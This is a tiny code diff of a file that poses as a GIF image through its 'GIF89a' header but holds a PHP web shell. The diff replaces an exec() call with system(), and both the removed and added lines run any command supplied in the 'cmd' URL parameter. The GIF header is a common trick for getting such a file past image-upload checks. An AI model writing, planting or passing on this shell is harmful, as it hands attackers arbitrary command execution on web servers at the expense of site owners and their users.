@@ -1,2 +1,2 @@
 GIF89a
-<?php echo exec($_GET['cmd']); ?>
+<?php system($_GET['cmd']); ?>
